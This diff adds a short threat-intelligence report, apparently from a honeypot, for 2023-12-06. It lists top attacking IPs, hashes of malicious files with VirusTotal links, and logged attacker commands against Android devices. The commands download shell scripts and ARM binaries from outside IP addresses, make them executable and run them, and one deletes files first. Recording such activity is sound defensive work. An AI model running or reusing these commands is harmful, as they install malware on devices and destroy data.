@@ -1,0 +1,20 @@
+Top 5 IPs for 2023-12-06:
+89.33.44.43
+43.153.17.62
+115.219.2.253
+117.2.142.24
+201.86.35.193
+
+Malcious files seen: 
+5b4e9fc4c7589dbf78e5456cd66d7db52697ba72a2653e336a0c21f48a531e6c
+https://www.virustotal.com/gui/file/5b4e9fc4c7589dbf78e5456cd66d7db52697ba72a2653e336a0c21f48a531e6c
+a6fbbdec757b0fe91ea18dc3d9f7b379c18ca49eeef63afaea8da3c9385b1049
+https://www.virustotal.com/gui/file/a6fbbdec757b0fe91ea18dc3d9f7b379c18ca49eeef63afaea8da3c9385b1049
+55f7d9e99b8e2d4e0e193b2f0275501e6d9c1ebd29cadbea6a0da48a8587e3e0
+https://www.virustotal.com/gui/file/55f7d9e99b8e2d4e0e193b2f0275501e6d9c1ebd29cadbea6a0da48a8587e3e0
+
+Downloaded from:
+cd /data/local/tmp/; busybox wget http://14.225.211.141/ab.sh; sh ab.sh; curl http://14.225.211.141/ac.sh; sh ac.sh; wget http://14.225.211.141/aw.sh; sh aw.sh
+cd /data/local/tmp/; busybox wget http://45.95.146.55/xaarch64; chmod 777 xaarch64; ./xaarch64 android.aarch64
+cd /data/local/tmp/; busybox wget http://45.95.146.55/xarm7; chmod 777 xarm7; ./xarm7 android.arm
+cd /data/local/tmp/; rm *; busybox wget http://45.95.147.171/arm7; chmod 777 arm7; ./arm7 ADB
